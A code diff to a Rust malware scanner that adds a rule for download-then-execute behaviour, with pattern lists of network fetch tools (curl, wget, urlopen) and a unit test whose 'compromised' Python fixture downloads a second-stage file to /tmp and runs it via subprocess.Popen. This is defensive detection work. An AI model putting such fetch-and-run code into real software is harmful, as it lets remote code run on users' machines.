@@ -1491,6 +1491,7 @@ enum CapabilityKind {
     SensitivePath,
     Network,
     Process,
+    DownloadExecute,
 }
 
 #[derive(Debug, Clone)]
@@ -1565,6 +1566,12 @@ fn run_behavior_rules(
                     ArtifactFindingSeverity::High,
                     "Trigger-reachable code contains a concrete subprocess or shell execution API.",
                 ),
+                CapabilityKind::DownloadExecute => (
+                    "WT-DOWNLOAD-EXEC-002",
+                    ArtifactFindingCategory::DownloadExecuteCapability,
+                    ArtifactFindingSeverity::High,
+                    "One trigger-reachable file contains a concrete network source, a later staged-file write, and a process invocation of that same staged path.",
+                ),
             };
             findings.push(make_finding(
                 artifact,
@@ -1626,6 +1633,9 @@ fn scan_capabilities(file: &NormalizedMemberContent) -> Vec<CapabilityMatch> {
         }
         offset += inclusive_line.len();
     }
+    if let Some(range) = staged_download_execute_range(text) {
+        found.insert(CapabilityKind::DownloadExecute, range);
+    }
     found
         .into_iter()
         .map(|(kind, range)| CapabilityMatch {
@@ -1685,19 +1695,6 @@ fn add_composite_findings(
             ArtifactFindingCategory::SensitiveFileExfiltrationCapability,
             ArtifactFindingSeverity::Critical,
             "One trigger-reachable closure contains sensitive-path access and a network sink.",
-            vec![source.file_id.clone()],
-        ));
-    }
-    if let (Some(source), Some(sink)) = (network, process) {
-        output.push(make_finding(
-            artifact,
-            graph,
-            reachable,
-            sink,
-            "WT-DOWNLOAD-EXEC-001",
-            ArtifactFindingCategory::DownloadExecuteCapability,
-            ArtifactFindingSeverity::High,
-            "One trigger-reachable closure contains network and process execution capabilities.",
             vec![source.file_id.clone()],
         ));
     }
@@ -2511,6 +2508,107 @@ fn sensitive_path_access(line: &str) -> bool {
         && first_pattern(line, FILE_ACCESS_PATTERNS).is_some()
 }
 
+fn staged_download_execute_range(text: &str) -> Option<EvidenceRange> {
+    let mut network_source = None;
+    let mut staged_targets = BTreeMap::new();
+    let mut offset = 0usize;
+    for (line_index, inclusive_line) in text.split_inclusive('\n').enumerate() {
+        let line = inclusive_line.strip_suffix('\n').unwrap_or(inclusive_line);
+        if line.trim_start().starts_with('#') {
+            offset += inclusive_line.len();
+            continue;
+        }
+        let trimmed = line.trim_start();
+        if trimmed.starts_with("def ") || trimmed.starts_with("async def ") {
+            network_source = None;
+            staged_targets.clear();
+        }
+        if let Some((start, _)) = first_pattern(line, DOWNLOAD_SOURCE_PATTERNS) {
+            network_source = Some((line_index, offset + start));
+        }
+        if let Some(source) = network_source {
+            if let Some(target) = staged_write_target(line) {
+                staged_targets.entry(target).or_insert(source);
+            }
+        }
+        if first_pattern(line, PROCESS_PATTERNS).is_some() {
+            if let Some((_, (source_line, source_byte))) = staged_targets
+                .iter()
+                .find(|(target, _)| line_references_target(line, target))
+            {
+                return Some(EvidenceRange::Lines {
+                    start_line: *source_line as u64 + 1,
+                    end_line: line_index as u64 + 1,
+                    start_byte: *source_byte as u64,
+                    end_byte: (offset + line.len()) as u64,
+                });
+            }
+        }
+        offset += inclusive_line.len();
+    }
+    None
+}
+
+fn staged_write_target(line: &str) -> Option<String> {
+    for (pattern, argument_index) in STAGED_WRITE_CALLS {
+        let Some(start) = line.find(pattern) else {
+            continue;
+        };
+        if *pattern == "open(" {
+            let expression = &line[start..];
+            if !WRITE_MODE_PATTERNS
+                .iter()
+                .any(|mode| expression.contains(mode))
+            {
+                continue;
+            }
+        }
+        let arguments = &line[start + pattern.len()..];
+        let Some(argument) = arguments.split(',').nth(*argument_index) else {
+            continue;
+        };
+        let argument = argument.trim();
+        if let Some(target) = normalize_staged_target(argument) {
+            return Some(target);
+        }
+    }
+    None
+}
+
+fn normalize_staged_target(argument: &str) -> Option<String> {
+    let argument = argument.trim().trim_end_matches([')', ']', '}']).trim();
+    if argument.len() >= 2 {
+        let first = argument.as_bytes()[0];
+        let last = argument.as_bytes()[argument.len() - 1];
+        if (first == b'\'' && last == b'\'') || (first == b'"' && last == b'"') {
+            let literal = &argument[1..argument.len() - 1];
+            return (!literal.is_empty() && literal.len() <= 256).then(|| literal.to_string());
+        }
+    }
+    (!argument.is_empty()
+        && argument.len() <= 128
+        && argument
+            .bytes()
+            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'.')))
+    .then(|| argument.to_string())
+}
+
+fn line_references_target(line: &str, target: &str) -> bool {
+    if target.bytes().any(|byte| matches!(byte, b'/' | b'\\')) {
+        return line.contains(target);
+    }
+    line.match_indices(target).any(|(start, _)| {
+        let before = line[..start].bytes().next_back();
+        let end = start + target.len();
+        let after = line[end..].bytes().next();
+        !before.is_some_and(is_reference_character) && !after.is_some_and(is_reference_character)
+    })
+}
+
+fn is_reference_character(byte: u8) -> bool {
+    byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'.')
+}
+
 const ENVIRONMENT_PATTERNS: &[&str] = &[
     "process.env",
     "process['env']",
@@ -2569,6 +2667,43 @@ const FILE_ACCESS_PATTERNS: &[&str] = &[
     "Get-Content ",
 ];
 
+const STAGED_WRITE_CALLS: &[(&str, usize)] = &[
+    ("open(", 0),
+    ("urlretrieve(", 1),
+    ("writeFile(", 0),
+    ("writeFileSync(", 0),
+    ("createWriteStream(", 0),
+    ("write_bytes(", 0),
+    ("write_text(", 0),
+];
+
+const WRITE_MODE_PATTERNS: &[&str] = &[
+    ", \"w\"",
+    ", 'w'",
+    ",\"w\"",
+    ",'w'",
+    ", \"wb\"",
+    ", 'wb'",
+    ",\"wb\"",
+    ",'wb'",
+    ", \"a\"",
+    ", 'a'",
+    ",\"a\"",
+    ",'a'",
+    ", \"ab\"",
+    ", 'ab'",
+    ",\"ab\"",
+    ",'ab'",
+    "mode=\"w\"",
+    "mode='w'",
+    "mode=\"wb\"",
+    "mode='wb'",
+    "mode=\"a\"",
+    "mode='a'",
+    "mode=\"ab\"",
+    "mode='ab'",
+];
+
 const NETWORK_PATTERNS: &[&str] = &[
     "https.request(",
     "http.request(",
@@ -2603,6 +2738,28 @@ const NETWORK_PATTERNS: &[&str] = &[
     "nslookup ",
 ];
 
+const DOWNLOAD_SOURCE_PATTERNS: &[&str] = &[
+    "https.request(",
+    "http.request(",
+    "https.get(",
+    "http.get(",
+    "fetch(",
+    "globalThis.fetch(",
+    "axios.get(",
+    "axios.post(",
+    "axios.request(",
+    "got(",
+    "requests.get(",
+    "requests.post(",
+    "requests.request(",
+    "httpx.get(",
+    "httpx.post(",
+    "urllib.request.urlopen(",
+    "urllib.request.urlretrieve(",
+    "curl ",
+    "wget ",
+];
+
 const PROCESS_PATTERNS: &[&str] = &[
     "node:child_process",
     "require('child_process')",
@@ -2629,6 +2786,55 @@ const PROCESS_PATTERNS: &[&str] = &[
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn staged_download_execute_requires_the_written_target_at_the_process_sink() {
+        let benign = r#"import subprocess
+import urllib.request
+
+def status_and_render():
+    body = urllib.request.urlopen("https://example.invalid/status").read()
+    with open("/tmp/sdk-cache", "wb") as cache:
+        cache.write(body)
+    subprocess.run(["printf", "sdk-helper"], check=False)
+"#;
+        assert_eq!(staged_download_execute_range(benign), None);
+
+        let separate_functions = r#"import subprocess
+import urllib.request
+
+def refresh_cache():
+    with urllib.request.urlopen("https://example.invalid/status") as response:
+        with open(destination, "wb") as output:
+            output.write(response.read())
+
+def run_existing_tool():
+    subprocess.run([destination], check=False)
+"#;
+        assert_eq!(staged_download_execute_range(separate_functions), None);
+
+        let compromised = r#"import subprocess
+import urllib.request
+
+def fetch_and_launch():
+    destination = "/tmp/inert-second-stage"
+    with urllib.request.urlopen("https://example.invalid/second-stage") as response:
+        with open(destination, "wb") as output:
+            output.write(response.read())
+    subprocess.Popen([destination])
+"#;
+        let range = staged_download_execute_range(compromised)
+            .expect("the staged path reaches the process sink");
+        let (start, end) = range.byte_bounds();
+        let selected = &compromised.as_bytes()[start as usize..end as usize];
+        assert!(selected.starts_with(b"urllib.request.urlopen("));
+        assert!(selected
+            .windows(b"open(destination, \"wb\")".len())
+            .any(|window| window == b"open(destination, \"wb\")"));
+        assert!(selected
+            .windows(b"subprocess.Popen([destination]".len())
+            .any(|window| window == b"subprocess.Popen([destination]"));
+    }
 
     #[test]
     fn relative_path_resolution_rejects_escape() {
